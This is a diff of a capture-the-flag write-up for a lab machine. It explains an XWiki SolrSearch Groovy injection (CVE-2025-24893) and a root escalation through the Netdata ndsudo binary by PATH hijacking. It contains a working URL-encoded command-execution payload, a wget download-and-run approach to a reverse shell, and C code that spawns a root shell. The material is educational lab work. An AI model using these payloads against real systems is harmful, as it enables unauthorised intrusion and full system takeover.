@@ -24,16 +24,42 @@ nmap -Pn -p22,80,8080 -sC -sV 10.10.11.80
 ### Vulnerability: CVE-2025-24893
 XWiki Platform 15.10.10 suffers from a critical Remote Code Execution vulnerability in the SolrSearch endpoint, allowing guest users to execute arbitrary Groovy code.
 
-### Exploitation
+### How the Vulnerability Works
 
-1. **Initial Command Execution Test:**
-```bash
-# URL-encoded payload for: whoami
-http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln(%22whoami%22.execute().text)%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D
+**The SolrSearch Endpoint Flaw:**
+XWiki's SolrSearch functionality processes user input through a Groovy template engine without proper sanitization. The vulnerability exists in how XWiki handles the `text` parameter when generating RSS feeds.
+
+**Groovy Code Injection Mechanism:**
+1. **Template Processing:** XWiki uses Groovy templates to dynamically generate content
+2. **Insufficient Sanitization:** The `text` parameter gets processed directly by the Groovy engine
+3. **Escape Sequence:** Using `}}}` we can break out of the current context
+4. **Code Execution:** `{{groovy}}` tags allow arbitrary Groovy code execution
+5. **Command Execution:** Groovy's `.execute()` method runs system commands
+
+**Payload Structure Breakdown:**
+```
+%7D%7D%7D = }}} (breaks out of current template context)
+%7B%7Basync%20async%3Dfalse%7D%7D = {{async async=false}} (sets execution context)
+%7B%7Bgroovy%7D%7D = {{groovy}} (starts Groovy code block)
+println(%22whoami%22.execute().text) = println("whoami".execute().text)
+%7B%7B%2Fgroovy%7D%7D = {{/groovy}} (ends Groovy code block)
+%7B%7B%2Fasync%7D%7D = {{/async}} (ends async context)
 ```
 
-2. **Reverse Shell via File Download:**
-The key insight is to use `wget` to download shell scripts rather than trying to inject complex payloads directly through URL encoding.
+### Exploitation Strategy
+
+**Why File Download Over Direct Injection:**
+Direct command injection through URL parameters has several limitations:
+- **URL Encoding Complexity:** Special characters get mangled in HTTP requests
+- **Length Restrictions:** URLs have practical length limits
+- **Character Restrictions:** Some shells and special characters don't survive the encoding process
+- **Reliability Issues:** Complex payloads often fail due to encoding/decoding mismatches
+
+**File Download Approach Benefits:**
+- **Clean Execution:** Simple commands like `wget` are reliable
+- **Complex Payloads:** Can download and execute sophisticated scripts
+- **No Encoding Issues:** The actual payload isn't URL-encoded
+- **Flexibility:** Easy to modify payloads without changing the injection vector
 
 **Step 1: Create shell script locally:**
 ```bash
@@ -94,21 +120,68 @@ find / -perm -4000 2>/dev/null | grep netdata
 /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help
 ```
 
+### Understanding the SUID Path Manipulation Vulnerability
+
+**How ndsudo Works:**
+The `ndsudo` binary is designed to allow Netdata to run specific privileged commands safely. It:
+1. **Maintains a whitelist** of allowed command names (nvme, megacli, arcconf)
+2. **Uses PATH environment variable** to locate executables
+3. **Executes commands with root privileges** (due to SUID bit)
+
+**The Security Flaw:**
+The vulnerability exists because `ndsudo` trusts the `PATH` environment variable provided by the user:
+1. **PATH Traversal:** User controls where ndsudo looks for executables
+2. **No Absolute Paths:** ndsudo doesn't use hardcoded paths to binaries
+3. **First Match Wins:** The first executable found in PATH gets executed
+4. **Privilege Inheritance:** The malicious executable inherits root privileges
+
+**Attack Vector:**
+```
+1. User creates malicious 'nvme' executable in /tmp
+2. User modifies PATH to include /tmp first: PATH=/tmp:$PATH
+3. ndsudo searches PATH for 'nvme' executable
+4. ndsudo finds /tmp/nvme (our malicious binary) first
+5. ndsudo executes /tmp/nvme with root privileges
+6. Malicious binary runs as root and spawns shell
+```
+
 ### Critical Exploitation Detail: Why C Program vs Bash Script
 
-**The vulnerability requires a compiled C program, not a shell script. Here's why:**
+**This exploitation requires a compiled C program, not a shell script. Understanding why is crucial:**
 
-#### Shell Scripts Fail:
-- Modern systems **drop SUID privileges** when executing shell scripts for security
-- The bash script would run as the real user (oliver), not root
-- Even `bash -p` gets blocked by security protections
-- Shell interpreters have built-in protections against SUID escalation
+#### The SUID Execution Model:
+When a SUID binary executes another program, the target program can inherit elevated privileges, but this depends on how the program is structured.
 
-#### C Programs Succeed:
-- Compiled binaries properly **inherit the SUID context**
-- System calls like `setuid(0)` and `setgid(0)` work when you have effective root privileges
-- No interpreter security restrictions to bypass
-- Direct system calls provide reliable privilege escalation
+#### Why Shell Scripts Fail:
+1. **Security Policy Enforcement:** Modern Unix systems have security policies that **automatically drop SUID privileges** when executing shell scripts
+2. **Interpreter Protection:** The shell interpreter (bash, sh) has built-in protections that detect SUID context and refuse to escalate privileges
+3. **Historical Security Issues:** Shell scripts were historically abused for privilege escalation, so systems now block this attack vector
+4. **Process Execution Chain:** When ndsudo executes a shell script, the privilege escalation gets blocked at the shell interpreter level
+
+#### Why C Programs Succeed:
+1. **Direct System Calls:** Compiled C programs can make direct system calls (`setuid()`, `setgid()`) without an interpreter
+2. **Process Inheritance:** The C program directly inherits the SUID context from ndsudo
+3. **No Interpreter Barrier:** There's no shell interpreter to block privilege escalation
+4. **Explicit Privilege Setting:** The `setuid(0)` and `setgid(0)` calls explicitly set the process to run as root
+
+#### Technical Deep Dive:
+```c
+setuid(0);  // Sets both real and effective user ID to 0 (root)
+setgid(0);  // Sets both real and effective group ID to 0 (root)
+execl("/bin/bash", "bash", "-i", NULL);  // Spawns interactive bash as root
+```
+
+**The execution flow:**
+1. ndsudo (running as root due to SUID) executes our C program
+2. Our C program inherits root privileges from ndsudo
+3. `setuid(0)` makes the process fully root (not just effective UID)
+4. `execl()` replaces our program with bash, maintaining root privileges
+5. Result: Interactive bash shell running as root
+
+**Why the system calls work:**
+- The process already has **effective root privileges** from ndsudo
+- `setuid(0)` succeeds because we have permission to change to root
+- No interpreter security policies interfere with compiled binary execution
 
 ### Exploitation Steps
 
